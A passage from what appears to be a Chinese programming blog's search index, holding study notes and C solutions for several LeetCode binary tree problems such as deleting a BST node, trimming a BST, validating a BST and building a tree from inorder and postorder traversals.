class="line">        <span class="keyword">if</span>(!root-&gt;left &amp;&amp; !root-&gt;right)</span><br><span class="line">            root = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!root-&gt;left &amp;&amp; root-&gt;right)</span><br><span class="line">            root = root-&gt;right;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!root-&gt;right &amp;&amp; root-&gt;left)</span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">struct</span> TreeNode* tmp = root-&gt;right;</span><br><span class="line">            <span class="keyword">while</span>(tmp-&gt;left!=<span class="literal">NULL</span>)</span><br><span class="line">                tmp = tmp-&gt;left;</span><br><span class="line">            root-&gt;right = deleteN(root-&gt;right, tmp-&gt;val);</span><br><span class="line">            root-&gt;val = tmp-&gt;val;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">trimBST</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> low, <span class="type">int</span> high)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    root-&gt;left = trimBST(root-&gt;left, low, high);</span><br><span class="line">    root-&gt;right = trimBST(root-&gt;right, low, high);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val&lt;low || root-&gt;val&gt;high){ <span class="comment">//若节点值不满足条件，则删去</span></span><br><span class="line">        root = deleteN(root, root-&gt;val);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>代码随想录</strong>提供的代码更加简洁，使用的是先序遍历，由于该二叉树是二叉搜索树，因此当前节点值小于<code>low</code>时，则其左子树节点值均小于<code>low</code>，此时只需判断右子树节点是否满足条件；同理，当前节点值大于<code>high</code>时，右子树节点值均大于<code>high</code>，均需要删去，此时只需判断左子树的节点是否满足条件：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">trimBST</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> low, <span class="type">int</span> high)</span> {</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span> ) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; low) {</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">right</span> =</span> trimBST(root-&gt;right, low, high); <span class="comment">// 寻找符合区间[low, high]的节点</span></span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; high) {</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">left</span> =</span> trimBST(root-&gt;left, low, high); <span class="comment">// 寻找符合区间[low, high]的节点</span></span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        }</span><br><span class="line">        root-&gt;left = trimBST(root-&gt;left, low, high); <span class="comment">// root-&gt;left接入符合条件的左孩子</span></span><br><span class="line">        root-&gt;right = trimBST(root-&gt;right, low, high); <span class="comment">// root-&gt;right接入符合条件的右孩子</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>删除二叉搜索树中的节点</title>
    <link href="/2024/03/01/%E5%88%A0%E9%99%A4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/"/>
    <url>/2024/03/01/%E5%88%A0%E9%99%A4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/delete-node-in-a-bst/</p><p>对于二叉搜索树的删除有下面几种情况：</p><p>（1）叶结点：直接删除</p><p>（2）只有一棵子树：让子树成为 z 的父结点的子树</p><p>（3）有左右两个子树：令<strong>右子树最左下结点/直接后继（或左子树最右下结点/直接前驱）</strong>代替z，然后删除直接后继/直接前驱结点</p><blockquote><p>注意：删除一个结点可能会影响多个结点，因此可能要操作多次</p></blockquote><p>由上述情况可知可以使用递归比较方便</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">deleteNode</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> key)</span>{</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val &lt; key) <span class="comment">//若当前节点值小于目标值，则遍历右子树</span></span><br><span class="line">        root-&gt;right = deleteNode(root-&gt;right, key);</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val &gt; key) <span class="comment">//若当前节点值大于目标值，则遍历左子树</span></span><br><span class="line">        root-&gt;left = deleteNode(root-&gt;left, key);</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val == key) { <span class="comment">//若相等，则判断该节点的子树情况</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left!=<span class="literal">NULL</span> &amp;&amp; root-&gt;right==<span class="literal">NULL</span>)</span><br><span class="line">            root = root-&gt;left;  <span class="comment">//左子树不为空，右子树为空，则左子树取代当前节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;left==<span class="literal">NULL</span> &amp;&amp; root-&gt;right!=<span class="literal">NULL</span>)</span><br><span class="line">            root = root-&gt;right; <span class="comment">//左子树为空，右子树不为空，则右子树取代当前节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!root-&gt;left &amp;&amp; !root-&gt;right)</span><br><span class="line">            root = <span class="literal">NULL</span>; <span class="comment">//两个子树均为空，即当前节点是叶节点，直接置为空</span></span><br><span class="line">        <span class="keyword">else</span> { <span class="comment">//若左右子树均不为空</span></span><br><span class="line">            <span class="keyword">struct</span> TreeNode* tmp = root-&gt;right;</span><br><span class="line">            <span class="keyword">while</span>(tmp-&gt;left!=<span class="literal">NULL</span>)</span><br><span class="line">                tmp = tmp-&gt;left; <span class="comment">//待删除节点右子树最靠左的节点</span></span><br><span class="line">            root-&gt;right = deleteNode(root-&gt;right, tmp-&gt;val); <span class="comment">//删除右子树最左边节点</span></span><br><span class="line">            root-&gt;val = tmp-&gt;val; <span class="comment">//右子树最左边节点取代删除节点</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树的最近公共祖先</title>
    <link href="/2024/02/29/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/"/>
    <url>/2024/02/29/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/</p><p>这题用到了回溯的思想，所以用<strong>后序遍历</strong>（左-右-中），可以根据左右子树的返回值处理根节点。分为两种情况：</p><p><img src="https://assets.leetcode.com/uploads/2018/12/14/binarytree.png"></p><ol type="1"><li><p>p、q在二叉树的两边</p><p>当左、右子树均不为空，则该节点就是最近的公共祖先。</p><blockquote><p>例如上图中，<code>p-&gt;val = 7</code>，<code>q-&gt;val = 0</code>，这两个节点的公共祖先是<strong>节点3</strong>，模拟后序遍历并不断回溯的过程，发现直到<strong>节点3</strong>时，左右子树均不为空。（模拟代码的过程）</p></blockquote></li><li><p>p、q在二叉树的同一边</p><p>若p是q的祖先，则直接返回p；否则返回q</p><blockquote><p>若<code>p-&gt;val = 5</code>，<code>q-&gt;val = 7</code>；后序遍历，先找到左子树中的<code>p</code>节点，则直接返回，此时<code>left = p</code>；然后遍历根节点的右子树，返回值为空，即<code>right=NULL</code>；最后回溯到根节点，则返回不为空的节点，即<code>p</code>。</p><p>这个过程中<code>q</code>节点并没有被访问。</p></blockquote></li></ol><p>代码思路如下：</p><ul><li>若遍历过程中遍历到了空结点、<code>p</code>或<code>q</code>，则返回当前节点</li><li>遍历当前节点的左子树</li><li>遍历当前节点的右子树</li><li>若当前节点的左右子树不为空，则说明当前节点就是最近公共祖先</li><li>若一个子树为空另一个不为空，则返回不为空的子树；否则返回NULL</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">lowestCommonAncestor</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="keyword">struct</span> TreeNode* p, <span class="keyword">struct</span> TreeNode* q)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root || root==p || root==q)</span><br><span class="line">        <span class="keyword">return</span> root; <span class="comment">//若找到p或q则返回,若root为空则返回NULL</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">left</span> =</span> lowestCommonAncestor(root-&gt;left, p, q);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">right</span> =</span> lowestCommonAncestor(root-&gt;right, p, q);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(left!=<span class="literal">NULL</span> &amp;&amp; right!=<span class="literal">NULL</span>) <span class="comment">//若左右子树均找到了p、q，则返回最近的根节点</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> left == <span class="literal">NULL</span> ? right:left; <span class="comment">//p、q可能在同一边</span></span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉搜索树中的众数</title>
    <link href="/2024/02/29/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%9A%84%E4%BC%97%E6%95%B0/"/>
    <url>/2024/02/29/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%9A%84%E4%BC%97%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/find-mode-in-binary-search-tree/submissions</p><p>思路：</p><ul><li>先通过中序遍历得到该二叉树的有序序列</li><li>创建一个结构体数组保存不同节点值以及该节点值出现的频率</li><li>遍历有序序列填充结构体数组</li><li>遍历结构体数组，记录当前频率最大值，若出现更大值则将结果数组清空，填入新的节点值；若相等则将节点值加入结果数组；若小于则continue</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> {</span></span><br><span class="line">    <span class="type">int</span> f; <span class="comment">//频率</span></span><br><span class="line">    <span class="type">int</span> val; <span class="comment">//节点值</span></span><br><span class="line">}Node;</span><br><span class="line"><span class="type">void</span> <span class="title function_">inOrder</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span>* res, <span class="type">int</span>* top)</span> { <span class="comment">//中序遍历</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    inOrder(root-&gt;left, res, top);</span><br><span class="line">    res[(*top)++] = root-&gt;val;</span><br><span class="line">    inOrder(root-&gt;right, res, top);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span>* <span class="title function_">findMode</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span>* returnSize)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> res[<span class="number">10000</span>]; <span class="comment">//中序遍历的有序序列</span></span><br><span class="line">    <span class="type">int</span>* top = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    *top = <span class="number">0</span>; <span class="comment">//记录节点数</span></span><br><span class="line">    inOrder(root, res, top);</span><br><span class="line">    Node num[*top];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;*top; i++)</span><br><span class="line">        num[i].f = <span class="number">1</span>; <span class="comment">//初始化每个节点的频率为1</span></span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>; <span class="comment">//num数组的下标</span></span><br><span class="line">    num[count].val = res[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;*top; i++) {</span><br><span class="line">        <span class="keyword">if</span>(num[count].val==res[i]) <span class="comment">//若相等，则频率加1</span></span><br><span class="line">            num[count].f++;</span><br><span class="line">        <span class="keyword">else</span> {  <span class="comment">//若不等，则count加1</span></span><br><span class="line">            count++;</span><br><span class="line">            num[count].val = res[i];</span><br><span class="line">        }</span><br><span class="line">    }  </span><br><span class="line">    <span class="type">int</span> max = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span>* ans = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(count+<span class="number">1</span>));  <span class="comment">//结果数组</span></span><br><span class="line">    *returnSize=<span class="number">0</span>;  <span class="comment">//结果数组大小</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=count; i++) {</span><br><span class="line">        <span class="keyword">if</span>(max &gt; num[i].f)  <span class="comment">//若当前节点频率小于max，则继续</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(max &lt; num[i].f) {  <span class="comment">//若大于max，则清空结果数组，并记录新值</span></span><br><span class="line">            *returnSize=<span class="number">0</span>;</span><br><span class="line">            ans[(*returnSize)++] = num[i].val;</span><br><span class="line">            max = num[i].f;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>  <span class="comment">//若相等，则加入结果数组中</span></span><br><span class="line">            ans[(*returnSize)++] = num[i].val;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>验证二叉搜索树</title>
    <link href="/2024/02/29/%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"/>
    <url>/2024/02/29/%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/validate-binary-search-tree</p><p>二叉搜索树（又称二叉排序树）的特点如下：</p><ul><li>左子树 &lt; 根结点 &lt; 右子树</li><li><strong>中序遍历可得到有序序列</strong></li><li>从根结点开始比较，若关键字小于根结点则进入左子树，否则进入右子树</li><li>可使用递归，但执行效率低（空间复杂度高）；<strong>非递归使用循环</strong></li><li>结点的<strong>插入</strong>：插入的结点一定是<strong>叶子结点</strong>，可使用<strong>递归</strong>实现；若存在相同的关键字，插入失败</li></ul><p>这题使用中序遍历得到序列，然后判断该序列是否是升序的</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">inOrder</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span>* res,<span class="type">int</span>* top)</span> {</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    inOrder(root-&gt;left, res, top);</span><br><span class="line">    res[(*top)++] = root-&gt;val;</span><br><span class="line">    inOrder(root-&gt;right, res, top);</span><br><span class="line">}</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isValidBST</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> res[<span class="number">10000</span>];</span><br><span class="line">    <span class="type">int</span>* top = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    *top = <span class="number">0</span>;</span><br><span class="line">    inOrder(root, res, top);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;*top<span class="number">-1</span>; i++) {</span><br><span class="line">        <span class="keyword">if</span>(res[i]&gt;=res[i+<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }   </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>错误思路：递归判断每个子树是否满足“左孩子 &lt; 根结点 &lt;右孩子”，每个子树是满足该条件的，但是下面这种情况就会误判</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202402291336948.png"></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最大二叉树</title>
    <link href="/2024/02/29/%E6%9C%80%E5%A4%A7%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2024/02/29/%E6%9C%80%E5%A4%A7%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/maximum-binary-tree</p><p>这题的思路类似于根据中序和后序序列构造二叉树，只是<strong>判断根节点的方式不同</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">constructMaximumBinaryTree</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line">    <span class="keyword">if</span>(numsSize==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">res</span> =</span> (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> m_R = <span class="number">0</span>; <span class="comment">//记录最大元素的下标</span></span><br><span class="line">    <span class="type">int</span> max_n = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(max_n&lt;nums[i]) {  <span class="comment">//更新最大元素及下标值</span></span><br><span class="line">            max_n = nums[i];</span><br><span class="line">            m_R = i;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    res-&gt;val = nums[m_R];  <span class="comment">//根节点的值等于最大元素值</span></span><br><span class="line"></span><br><span class="line">    res-&gt;left = constructMaximumBinaryTree(nums, m_R);</span><br><span class="line">    res-&gt;right = constructMaximumBinaryTree(nums+m_R+<span class="number">1</span>, numsSize-m_R<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从中序与后序遍历序列构造二叉树</title>
    <link href="/2024/02/29/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2024/02/29/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal</p><blockquote><p><strong>唯一</strong>地确定一棵二叉树：</p><ol type="1"><li>先序和中序：先序确定根结点，中序确定左右子树</li><li>后序和中序：同上</li><li>层序和中序：层序遍历确定根结点</li></ol></blockquote><p>显然这题还是使用递归的思想，中序遍历是“左-中-右”，后序遍历是“左-右-中”，根据左右子树的顺序特点确定二叉树，思路如下：</p><ul><li>先写好退出递归的条件，即当序列数组为空时，返回NULL</li><li>然后开辟一个节点的空间，将当前的根节点（即<strong>后序遍历序列</strong>最后一个元素）存放在开辟的空间中</li><li>遍历<strong>中序遍历序列</strong>找到该根节点的位置，从该处分为左右子树，并将当前根节点的左右指针指向两个子树</li><li>接着分别对左子树和右子树进行上述操作（注意拆分后的序列的边界）</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>* inorder, <span class="type">int</span> inorderSize, <span class="type">int</span>* postorder, <span class="type">int</span> postorderSize)</span> {</span><br><span class="line">    <span class="keyword">if</span>(postorderSize&lt;=<span class="number">0</span>) <span class="comment">//若序列为空，则返回NULL</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">res</span> =</span> (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">    res-&gt;val = postorder[postorderSize<span class="number">-1</span>]; <span class="comment">//res为当前根节点</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;inorderSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(inorder[i] == res-&gt;val)  <span class="comment">//找到中序遍历序列中根节点的位置</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    res-&gt;left = buildTree(inorder, i, postorder, i); </span><br><span class="line">    res-&gt;right = buildTree(inorder+i+<span class="number">1</span>, inorderSize-i<span class="number">-1</span>, postorder+i, postorderSize-i<span class="number">-1</span>);   </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>路径总和</title>
    <link href="/2024/02/28/%E8%B7%AF%E5%BE%84%E6%80%BB%E5%92%8C/"/>
    <url>/2024/02/28/%E8%B7%AF%E5%BE%84%E6%80%BB%E5%92%8C/</url>
    
